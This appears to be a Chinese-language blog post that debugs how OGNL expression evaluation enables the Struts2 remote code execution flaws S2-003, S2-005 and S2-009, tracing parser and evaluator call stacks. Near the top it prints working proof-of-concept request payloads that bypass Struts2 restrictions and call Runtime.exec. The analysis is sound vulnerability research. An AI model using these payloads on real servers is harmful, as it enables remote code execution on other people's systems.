* 在分析Struts2历年RCE的过程中，对OGNL表达式求值 _（OGNL Expression Evaluation）_ 的执行细节存在一些不解和疑惑，便以本文记录跟踪调试的过程，不对的地方请指正。
### 前情简介
  * S2-003对`#`等特殊字符编码，并包裹在字符串中，利用OGNL表达式求值`(one)(two)`模型绕过限制
  * S2-005在基于S2-003的基础上，通过控制`allowStaticMethodAccess`绕过S2-003修复方案
  * S2-009通过HTTP传参将payload赋值在可控的action属性 _（setter()/getter()）_ 中，再利用额外请求参数，设置其名称为“无害”OGNL表达式绕过ParametersInterceptor中对参数名的正则限制，并成功执行payload
#### **PoC样本**
  * S2-003  
`(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew\u0020java.lang.Boolean(false)))&(asdf)(('\u0023rt.exec(\'calc\')')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1`
  * S2-005  
`('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew\u0020java.lang.Boolean(false)))&(asdf)(('\u0023rt.exec(\'calc\')')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1`
  * S2-009  
`foo=(#context['xwork.MethodAccessor.denyMethodExecution']=new
java.lang.Boolean(false),#_memberAccess['allowStaticMethodAccess']=new
java.lang.Boolean(true),@java.lang.Runtime@getRuntime().exec('calc'))(meh)&z[(foo)('meh')]=true`
### 关于OGNL
#### **一点点基础概念**
  * `$`，`#`，`@`和`%`
    * `$`：在配置文件、国际化资源文件中引用OGNL表达式
    * `#`：访问非root对象，相当于`ActionContext.getContext()`
    * `@`：访问静态属性、静态方法
    * `%`：强制内容为OGNL表达式
  * context和root
    * context：OGNL执行上下文环境，HashMap类型
    * root：根对象，ArrayList类型 _（默认访问对象，不需要#操作符）_
#### **OGNL表达式求值**
Apache官方描述
> If you follow an OGNL expression with a parenthesized expression, without a
> dot in front of the parentheses, OGNL will try to treat the result of the
> first expression as another expression to evaluate, and will use the result
> of the parenthesized expression as the root object for that evaluation. The
> result of the first expression may be any object; if it is an AST, OGNL
> assumes it is the parsed form of an expression and simply interprets it;
> otherwise, OGNL takes the string value of the object and parses that string
> to get the AST to interpret.  
>
> 如果你在任意对象后面紧接着一个带括号的OGNL表达式，而中间没有使用`.`符号连接，那么OGNL将会试着把第一个表达式的计算结果当作一个新的表达式再去计算，并且把带括号表达式的计算结果作为本次计算的根对象。第一个表达式的计算结果可以是任意对象；如果它是一个AST树，OGNL就会认为这是一个表达式的解析形态，然后直接解释它；否则，OGNL会拿到这个对象的字符串值，然后去解释通过解析这个字符串得到的AST树
> _（译者注：在root或context中搜索匹配）_ 。  
>  For example, this expression  
>  `#fact(30H)`  
>  looks up the fact variable, and interprets the value of that variable as an
> OGNL expression using the BigInteger representation of 30 as the root
> object. See below for an example of setting the fact variable with an
> expression that returns the factorial of its argument. Note that there is an
> ambiguity in OGNL’s syntax between this double evaluation operator and a
> method call. OGNL resolves this ambiguity by calling anything that looks
> like a method call, a method call. For example, if the current object had a
> fact property that held an OGNL factorial expression, you could not use this
> approach to call it  
>
> 查找这个`fact`变量，并将它的值当作一个使用`30H`作为根对象的OGNL表达式去解释。看下面的例子，设置一个返回传入参数阶乘结果的表达式的`fact`变量。注意，这里存在一个关于二次计算和方法调用之间的OGNL语法歧义。OGNL为了消除歧义，会把任何看起来像方法调用的语法都当作方法去调用。举个例子，如果当前对象中存在一个持有OGNL阶乘表达式的`fact`属性，你就不能用下面的形式去调用它  
>  `fact(30H)`  
>  because OGNL would interpret this as a call to the fact method. You could
> force the interpretation you want by surrounding the property reference by
> parentheses:  
>  因为OGNL将会把它当作一个`fact`方法去调用。你可以用括号将它括起来，强制让OGNL去对它作解释：  
>  `(fact)(30H)`
漏洞作者 _（Meder Kydyraliev, Google Security Team）_ 描述
> `(one)(two)`  
>  will evaluate one as an OGNL expression and will use its return value as
> another OGNL expression that it will evaluate with two as a root for the
> evaluation. So if one returns blah, then blah is evaluated as an OGNL
> statement.  
>  它将会把`one`当作一个OGNL表达式去计算，然后把它的结果当作另一个以`two`为根对象的OGNL表达式再一次计算。所以，如果`one`有返回内容
> _（译者注：能被正常计算，解析为AST树）_ ，那么这些内容将会被当作OGNL语句被计算。
_临时简单的翻译了一下便于自己理解，英语水平有限，比较生硬拗口，没有细究，还是尽量看原文自己理解原意吧_
根据以上描述也就能够推断，在`('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)`中，`one`是一个字符串，绕过了特殊字符检测，生成AST树后被解码为正常的`#_memberAccess["allowStaticMethodAccess"]`字符串，在第一次计算时拿到的是该字符串，然后尝试对它解析得到AST树，再次计算，导致内部实际payload被执行。
但是one和two的计算顺序、关系等细节如何？其他嵌套模型的解析如何？仍然存在一些疑问。
### 问题
  1. `(one)(two)`模型的具体执行流程
  2. `(one)((two)(three))`模型的具体执行流程
  3. 在S2-005的PoC中，`denyMethodExecution`和`allowStaticMethodAccess`两者使用的模型是否可以互换 _（位置可以）_
  4. 在S2-009的PoC中，`z[(foo)('meh')]`调整执行顺序的原理
  5. `(one).(two)`和`one,two`模型的差异
### 开始跟踪调试
#### **S2-003**
调试环境
  * struts2-core-2.0.8 _（应升到2.0.9或2.0.11.2，排除S2-001的干扰，以后有时间再做）_
  * xwork-core-2.0.3
  * ognl-2.6.11
调试过程 _（身体不适者请跳过，直接看“问题解决”部分内容）_
    [ 表层关键逻辑 ]
        com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
    [ 底层关键逻辑 ]
        com.opensymphony.xwork2.util.OgnlUtil.compile()
        ognl.ASTEval.getValueBody()
    [ 关键调用栈 ]
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept()
         -> com.opensymphony.xwork2.util.OgnlContextState.setDenyMethodExecution()  // 设置DenyMethodExecution为true，并放入context中
         -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
          // 遍历参数
           // 处理第一个参数“(aaa)(('\u0023context...foo')(\u0023foo...(false)))”
           -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.acceptableName()  // 判断参数名称是否包含“=”、“,”、“#”和“:”特殊字符，以及匹配excludeParams正则“dojo\.._”
           -> com.opensymphony.xwork2.util.OgnlValueStack.setValue()  // 此时expr为第一个参数名的字符串形式，\u0023未解码
            -> ognl.OgnlContext.put()  // 将expr放入context['conversion.property.fullName']中
            -> com.opensymphony.xwork2.util.OgnlUtil.setValue()
             -> com.opensymphony.xwork2.util.OgnlUtil.compile()  // 生成AST树
              // 先尝试在expressions对象缓存HashMap中查找是否已经编译过该expr，是则直接返回查找到的对象
              -> ognl.Ognl.parseExpression()  // ASTEval类型对象，\u0023在AST树节点中已解码
               // 以下为当前表达式的AST树生成过程，非完全通用，仅供参考
               -> ognl.OgnlParser.topLevelExpression()
                -> ognl.OgnlParser.expression()
                 -> ognl.OgnlParser.assignmentExpression()
                  -> ognl.OgnlParser.conditionalTestExpression()  // 条件测试
                   -> ognl.OgnlParser.logicalOrExpression()  // 逻辑或
                    -> ognl.OgnlParser.logicalAndExpression()  // 逻辑与
                     -> ognl.OgnlParser.inclusiveOrExpression()  // 或
                      -> ognl.OgnlParser.exclusiveOrExpression()  // 异或
                       -> ognl.OgnlParser.andExpression()  // 与
                        -> ognl.OgnlParser.equalityExpression()  // 相等
                         -> ognl.OgnlParser.relationalExpression()  // 关系
                          -> ognl.OgnlParser.shiftExpression()  // 移位
                           -> ognl.OgnlParser.additiveExpression()  // 加
                            -> ognl.OgnlParser.multiplicativeExpression()  // 乘
                             -> ognl.OgnlParser.unaryExpression()  // 乘
                              -> ognl.OgnlParser.unaryExpression()  // 一元
                               -> ognl.OgnlParser.navigationChain()
                                -> ognl.OgnlParser.primaryExpression()
                                // 定义当前节点（树根）为ASTEval类型
                                -> ognl.JJTOgnlParserState.openNodeScope()
                                -> ognl.JJTOgnlParserState.closeNodeScope()
                                 // 遍历节点栈（jjtree.nodes为栈结构，先左后右入栈）
                                  // 右节点
                                  -> ognl.JJTOgnlParserState.popNode()  // 右节点“("#context...")(#foo...)”出栈，ASTEval类型
                                  -> ognl.Node.jjtSetParent()  // 为出栈（右）节点设置父节点：当前节点（null）
                                  -> ognl.SimpleNode.jjtAddChild()  // 为当前节点增加右子节点：出栈（右）节点
                                  // 左节点
                                  -> ognl.JJTOgnlParserState.popNode()  // 左节点“aaa”出栈，ASTProperty类型
                                  -> ognl.Node.jjtSetParent()  // 为出栈（左）节点设置父节点：当前节点（null）
                                  -> ognl.SimpleNode.jjtAddChild()  // 为当前节点增加左子节点：出栈（左）节点
                                 -> ognl.JJTOgnlParserState.pushNode()  // 当前节点入栈
             -> ognl.Ognl.setValue()
              -> ognl.Ognl.addDefaultContext()
              -> ognl.SimpleNode.setValue()  // ASTEval未重写该方法，调用父类SimpleNode
               -> ognl.SimpleNode.evaluateSetValueBody()
                -> ognl.OgnlContext.setCurrentNode()  // 设置当前节点
                -> ognl.ASTEval.setValueBody()
                 // 取左子节点“aaa”，作为expr
                 -> ognl.SimpleNode.getValue()  // null
                  -> ognl.SimpleNode.evaluateGetValueBody()
                   -> ognl.ASTProperty.getValueBody()
                    -> ognl.ASTProperty.getProperty()  // 得到“aaa”字符串
                     -> ognl.SimpleNode.getValue()
                      -> ognl.SimpleNode.evaluateGetValueBody()
                       -> ognl.ASTConst.getValueBody()
                    -> ognl.OgnlRuntime.getProperty()  // null
                     -> ognl.OgnlRuntime.getPropertyAccessor()
                      -> ognl.OgnlRuntime.getHandler()
                     -> com.opensymphony.xwork2.util.CompoundRootAccessor.getProperty()
                      -> ognl.OgnlRuntime.hasGetProperty()
                       -> ognl.OgnlRuntime.hasGetMethod()  // 是否当前请求action的method
                        -> ognl.OgnlRuntime.getGetMethod()
                       -> ognl.OgnlRuntime.hasField()  // 是否当前请求action的field
                 // 取右子节点“("#context...")(#foo...)”，作为target
                 -> ognl.SimpleNode.getValue()
                  -> ognl.SimpleNode.evaluateGetValueBody()
                   -> ognl.ASTEval.getValueBody()
                    // 取左子节点“"#context..."”，作为expr
                    -> ognl.SimpleNode.getValue()  // 第一次计算，获得当前expr的值为去引号后内部字符串
                     -> ognl.SimpleNode.evaluateGetValueBody()
                      -> ognl.ASTConst.getValueBody()  // 去两边引号，得到内部字符串
                    // 取右子节点“#foo...”，作为source
                    -> ognl.SimpleNode.getValue()
                     -> ognl.SimpleNode.evaluateGetValueBody()
                      -> ognl.ASTAssign.getValueBody()
                       // 取右边值“new java.lang.Boolean(false)”，作为result
                       -> ognl.SimpleNode.getValue()
                        -> ognl.SimpleNode.evaluateGetValueBody()
                         -> ognl.ASTCtor.getValueBody()
                          -> ognl.OgnlRuntime.callConstructor()  // 反射，实例化Boolean(false)
                       // 取左边值“#foo”，赋值
                       -> ognl.SimpleNode.setValue()
                        -> ognl.SimpleNode.evaluateSetValueBody()
                         -> ognl.ASTVarRef.setValueBody()
                          -> ognl.OgnlContext.put()  // 将“#foo: false”放入context中
                    // 如果expr是AST节点，就强转Node接口类型（泛型），否则解析
                    -> ognl.Ognl.parseExpression()  // 将expr字符串解析为AST树，过程同上，略
                    -> ognl.OgnlContext.setRoot()  // 将source值覆盖当前root